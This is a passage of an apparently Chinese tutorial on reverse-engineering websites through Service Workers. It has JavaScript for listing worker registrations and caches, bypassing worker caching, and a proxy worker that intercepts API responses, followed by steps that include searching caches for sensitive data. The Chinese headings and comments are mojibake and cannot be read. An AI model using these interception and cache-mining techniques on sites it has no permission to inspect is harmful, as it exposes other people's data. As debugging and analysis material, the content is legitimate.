<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">const</span><span class="w"> </span><span class="nx">reg</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">registrations</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;\nRegistration:&#39;</span><span class="p">);</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;  Scope:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">reg</span><span class="p">.</span><span class="nx">scope</span><span class="p">);</span>

<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">reg</span><span class="p">.</span><span class="nx">active</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;  Active:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">reg</span><span class="p">.</span><span class="nx">active</span><span class="p">.</span><span class="nx">scriptURL</span><span class="p">);</span>
<span class="w">                </span><span class="k">await</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">analyzeWorker</span><span class="p">(</span><span class="nx">reg</span><span class="p">.</span><span class="nx">active</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>

<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">reg</span><span class="p">.</span><span class="nx">waiting</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;  Waiting:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">reg</span><span class="p">.</span><span class="nx">waiting</span><span class="p">.</span><span class="nx">scriptURL</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>

<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">reg</span><span class="p">.</span><span class="nx">installing</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;  Installing:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">reg</span><span class="p">.</span><span class="nx">installing</span><span class="p">.</span><span class="nx">scriptURL</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="k">await</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">analyzeCaches</span><span class="p">();</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">async</span><span class="w"> </span><span class="nx">analyzeWorker</span><span class="p">(</span><span class="nx">worker</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="nx">worker</span><span class="p">.</span><span class="nx">scriptURL</span><span class="p">);</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">text</span><span class="p">();</span>

<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;  Script size:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">code</span><span class="p">.</span><span class="nx">length</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;bytes&#39;</span><span class="p">);</span>

<span class="w">            </span><span class="c1">// åˆ†æä»£ç ç‰¹å¾</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">features</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">hasInstallListener</span><span class="o">:</span><span class="w"> </span><span class="nx">code</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&quot;addEventListener(&#39;install&#39;&quot;</span><span class="p">),</span>
<span class="w">                </span><span class="nx">hasActivateListener</span><span class="o">:</span><span class="w"> </span><span class="nx">code</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&quot;addEventListener(&#39;activate&#39;&quot;</span><span class="p">),</span>
<span class="w">                </span><span class="nx">hasFetchListener</span><span class="o">:</span><span class="w"> </span><span class="nx">code</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&quot;addEventListener(&#39;fetch&#39;&quot;</span><span class="p">),</span>
<span class="w">                </span><span class="nx">hasMessageListener</span><span class="o">:</span><span class="w"> </span><span class="nx">code</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&quot;addEventListener(&#39;message&#39;&quot;</span><span class="p">),</span>
<span class="w">                </span><span class="nx">hasPushListener</span><span class="o">:</span><span class="w"> </span><span class="nx">code</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&quot;addEventListener(&#39;push&#39;&quot;</span><span class="p">),</span>
<span class="w">                </span><span class="nx">usesCacheAPI</span><span class="o">:</span><span class="w"> </span><span class="nx">code</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;caches.&#39;</span><span class="p">),</span>
<span class="w">                </span><span class="nx">usesIndexedDB</span><span class="o">:</span><span class="w"> </span><span class="nx">code</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;indexedDB&#39;</span><span class="p">),</span>
<span class="w">                </span><span class="nx">hasWorkbox</span><span class="o">:</span><span class="w"> </span><span class="nx">code</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;workbox&#39;</span><span class="p">)</span>
<span class="w">            </span><span class="p">};</span>

<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;  Features:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">features</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">&#39;  Failed to analyze:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">e</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">async</span><span class="w"> </span><span class="nx">analyzeCaches</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;\n=== Cache Analysis ===&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">cacheNames</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">caches</span><span class="p">.</span><span class="nx">keys</span><span class="p">();</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Found </span><span class="si">${</span><span class="nx">cacheNames</span><span class="p">.</span><span class="nx">length</span><span class="si">}</span><span class="sb"> cache(s)`</span><span class="p">);</span>

<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">const</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="nx">cacheNames</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">cache</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">caches</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="nx">name</span><span class="p">);</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">keys</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">cache</span><span class="p">.</span><span class="nx">keys</span><span class="p">();</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`\n</span><span class="si">${</span><span class="nx">name</span><span class="si">}</span><span class="sb">: </span><span class="si">${</span><span class="nx">keys</span><span class="p">.</span><span class="nx">length</span><span class="si">}</span><span class="sb"> entries`</span><span class="p">);</span>

<span class="w">            </span><span class="c1">// æ˜¾ç¤ºå‰5ä¸ªæ¡ç›®</span>
<span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">let</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">min</span><span class="p">(</span><span class="mf">5</span><span class="p">,</span><span class="w"> </span><span class="nx">keys</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span><span class="w"> </span><span class="nx">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`  - </span><span class="si">${</span><span class="nx">keys</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">url</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">keys</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">5</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`  ... and </span><span class="si">${</span><span class="nx">keys</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">5</span><span class="si">}</span><span class="sb"> more`</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">async</span><span class="w"> </span><span class="nx">sendMessage</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">navigator</span><span class="p">.</span><span class="nx">serviceWorker</span><span class="p">.</span><span class="nx">controller</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">&#39;No active Service Worker controller&#39;</span><span class="p">);</span>
<span class="w">            </span><span class="k">return</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">channel</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">MessageChannel</span><span class="p">();</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Promise</span><span class="p">((</span><span class="nx">resolve</span><span class="p">,</span><span class="w"> </span><span class="nx">reject</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">channel</span><span class="p">.</span><span class="nx">port1</span><span class="p">.</span><span class="nx">onmessage</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">event</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">resolve</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
<span class="w">            </span><span class="p">};</span>

<span class="w">            </span><span class="nx">navigator</span><span class="p">.</span><span class="nx">serviceWorker</span><span class="p">.</span><span class="nx">controller</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nx">channel</span><span class="p">.</span><span class="nx">port2</span><span class="p">]);</span>

<span class="w">            </span><span class="nx">setTimeout</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">reject</span><span class="p">(</span><span class="s1">&#39;Timeout&#39;</span><span class="p">),</span><span class="w"> </span><span class="mf">5000</span><span class="p">);</span>
<span class="w">        </span><span class="p">});</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">async</span><span class="w"> </span><span class="nx">unregisterAll</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">const</span><span class="w"> </span><span class="nx">reg</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">registrations</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">await</span><span class="w"> </span><span class="nx">reg</span><span class="p">.</span><span class="nx">unregister</span><span class="p">();</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Unregistered:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">reg</span><span class="p">.</span><span class="nx">scope</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="c1">// ä½¿ç”¨</span>
<span class="kd">const</span><span class="w"> </span><span class="k">debugger</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">ServiceWorkerDebugger</span><span class="p">();</span>
<span class="k">debugger</span><span class="p">.</span><span class="nx">init</span><span class="p">();</span>
</code></pre>
      </div>

      <h3 id="ç¤ºä¾‹2-ç»•è¿‡-service-worker-ç¼“å­˜">ç¤ºä¾‹2: ç»•è¿‡ Service Worker ç¼“å­˜</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ–¹æ³•1: å¼ºåˆ¶ç»•è¿‡ç¼“å­˜</span>
<span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">bypassServiceWorkerCache</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">cache</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;no-store&#39;</span><span class="p">,</span>
<span class="w">        </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="s1">&#39;Cache-Control&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;no-cache&#39;</span><span class="p">,</span>
<span class="w">            </span><span class="s1">&#39;Pragma&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;no-cache&#39;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">});</span>
<span class="p">}</span>

<span class="c1">// æ–¹æ³•2: ä¸´æ—¶æ³¨é”€ Service Worker</span>
<span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">fetchWithoutServiceWorker</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">registrations</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">navigator</span><span class="p">.</span><span class="nx">serviceWorker</span><span class="p">.</span><span class="nx">getRegistrations</span><span class="p">();</span>

<span class="w">    </span><span class="c1">// ä¿å­˜æ³¨å†Œä¿¡æ¯</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">savedRegs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">registrations</span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">({</span>
<span class="w">        </span><span class="nx">scriptURL</span><span class="o">:</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">active</span><span class="o">?</span><span class="p">.</span><span class="nx">scriptURL</span><span class="p">,</span>
<span class="w">        </span><span class="nx">scope</span><span class="o">:</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">scope</span>
<span class="w">    </span><span class="p">}));</span>

<span class="w">    </span><span class="c1">// æ³¨é”€æ‰€æœ‰ Service Worker</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nb">Promise</span><span class="p">.</span><span class="nx">all</span><span class="p">(</span><span class="nx">registrations</span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">unregister</span><span class="p">()));</span>

<span class="w">    </span><span class="c1">// æ‰§è¡Œè¯·æ±‚</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// é‡æ–°æ³¨å†Œ Service Worker</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">const</span><span class="w"> </span><span class="nx">reg</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="nx">savedRegs</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">reg</span><span class="p">.</span><span class="nx">scriptURL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">await</span><span class="w"> </span><span class="nx">navigator</span><span class="p">.</span><span class="nx">serviceWorker</span><span class="p">.</span><span class="nx">register</span><span class="p">(</span><span class="nx">reg</span><span class="p">.</span><span class="nx">scriptURL</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">scope</span><span class="o">:</span><span class="w"> </span><span class="nx">reg</span><span class="p">.</span><span class="nx">scope</span>
<span class="w">            </span><span class="p">});</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">response</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// æ–¹æ³•3: ä½¿ç”¨ iframe ç»•è¿‡</span>
<span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">fetchInIframe</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Promise</span><span class="p">((</span><span class="nx">resolve</span><span class="p">,</span><span class="w"> </span><span class="nx">reject</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">iframe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;iframe&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">iframe</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;none&#39;</span><span class="p">;</span>
<span class="w">        </span><span class="nx">iframe</span><span class="p">.</span><span class="nx">src</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;about:blank&#39;</span><span class="p">;</span>

<span class="w">        </span><span class="nx">iframe</span><span class="p">.</span><span class="nx">onload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="kd">const</span><span class="w"> </span><span class="nx">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">iframe</span><span class="p">.</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nx">fetch</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>
<span class="w">                </span><span class="kd">const</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">text</span><span class="p">();</span>
<span class="w">                </span><span class="nx">resolve</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">reject</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">finally</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">removeChild</span><span class="p">(</span><span class="nx">iframe</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">};</span>

<span class="w">        </span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">iframe</span><span class="p">);</span>
<span class="w">    </span><span class="p">});</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="ç¤ºä¾‹3-service-worker-ä»£ç†">ç¤ºä¾‹3: Service Worker ä»£ç†</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ³¨å†Œä¸€ä¸ªè‡ªå®šä¹‰çš„ Service Worker æ¥æ‹¦æˆªå’Œä¿®æ”¹è¯·æ±‚</span>

<span class="c1">// proxy-sw.js</span>
<span class="nx">self</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;fetch&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">event</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">URL</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">url</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// æ‹¦æˆª API è¯·æ±‚</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">url</span><span class="p">.</span><span class="nx">pathname</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s1">&#39;/api/&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">event</span><span class="p">.</span><span class="nx">respondWith</span><span class="p">(</span>
<span class="w">            </span><span class="nx">fetch</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">request</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">response</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="c1">// å…‹éš†å“åº”ä»¥ä¾¿è¯»å–</span>
<span class="w">                </span><span class="kd">const</span><span class="w"> </span><span class="nx">clonedResponse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">clone</span><span class="p">();</span>

<span class="w">                </span><span class="c1">// è®°å½•å“åº”</span>
<span class="w">                </span><span class="nx">clonedResponse</span><span class="p">.</span><span class="nx">json</span><span class="p">().</span><span class="nx">then</span><span class="p">(</span><span class="nx">data</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[Proxy SW] API Response:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">url</span><span class="p">.</span><span class="nx">pathname</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">);</span>

<span class="w">                    </span><span class="c1">// å‘é€åˆ°ä¸»çº¿ç¨‹</span>
<span class="w">                    </span><span class="nx">self</span><span class="p">.</span><span class="nx">clients</span><span class="p">.</span><span class="nx">matchAll</span><span class="p">().</span><span class="nx">then</span><span class="p">(</span><span class="nx">clients</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">                        </span><span class="nx">clients</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">client</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">                            </span><span class="nx">client</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">({</span>
<span class="w">                                </span><span class="nx">type</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;API_RESPONSE&#39;</span><span class="p">,</span>
<span class="w">                                </span><span class="nx">url</span><span class="o">:</span><span class="w"> </span><span class="nx">url</span><span class="p">.</span><span class="nx">href</span><span class="p">,</span>
<span class="w">                                </span><span class="nx">data</span><span class="o">:</span><span class="w"> </span><span class="nx">data</span>
<span class="w">                            </span><span class="p">});</span>
<span class="w">                        </span><span class="p">});</span>
<span class="w">                    </span><span class="p">});</span>
<span class="w">                </span><span class="p">});</span>

<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="nx">response</span><span class="p">;</span>
<span class="w">            </span><span class="p">})</span>
<span class="w">        </span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// é»˜è®¤è¡Œä¸º</span>
<span class="w">    </span><span class="nx">event</span><span class="p">.</span><span class="nx">respondWith</span><span class="p">(</span><span class="nx">fetch</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">request</span><span class="p">));</span>
<span class="p">});</span>

<span class="c1">// ä¸»é¡µé¢ä¸­æ³¨å†Œ</span>
<span class="nx">navigator</span><span class="p">.</span><span class="nx">serviceWorker</span><span class="p">.</span><span class="nx">register</span><span class="p">(</span><span class="s1">&#39;/proxy-sw.js&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="nx">scope</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;/&#39;</span><span class="p">});</span>

<span class="c1">// ç›‘å¬æ‹¦æˆªçš„æ•°æ®</span>
<span class="nx">navigator</span><span class="p">.</span><span class="nx">serviceWorker</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">event</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">type</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;API_RESPONSE&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Intercepted API call:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">event</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">url</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Data:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">event</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æœ€ä½³å®è·µ">æœ€ä½³å®è·µ</h2>

      <h3 id="é€†å‘åˆ†ææµç¨‹">é€†å‘åˆ†ææµç¨‹</h3>

      <ol>
        <li>
          <p><strong>æ£€æµ‹ Service Worker å­˜åœ¨</strong></p>

          <ul>
            <li>æ£€æŸ¥ <code>navigator.serviceWorker</code> API</li>
            <li>æŸ¥çœ‹å¼€å‘è€…å·¥å…· Application é¢æ¿</li>
            <li>æšä¸¾æ‰€æœ‰æ³¨å†Œ</li>
          </ul>
        </li>
        <li>
          <p><strong>æå– Service Worker è„šæœ¬</strong></p>

          <ul>
            <li>è·å–è„šæœ¬ URL</li>
            <li>ä¸‹è½½å¹¶åˆ†æä»£ç </li>
            <li>è¯†åˆ«ç¼“å­˜ç­–ç•¥</li>
          </ul>
        </li>
        <li>
          <p><strong>åˆ†æç¼“å­˜å†…å®¹</strong></p>

          <ul>
            <li>æšä¸¾æ‰€æœ‰ç¼“å­˜</li>
            <li>æå–ç¼“å­˜çš„ API å“åº”</li>
            <li>å¯»æ‰¾æ•æ„Ÿæ•°æ®</li>
          </ul>
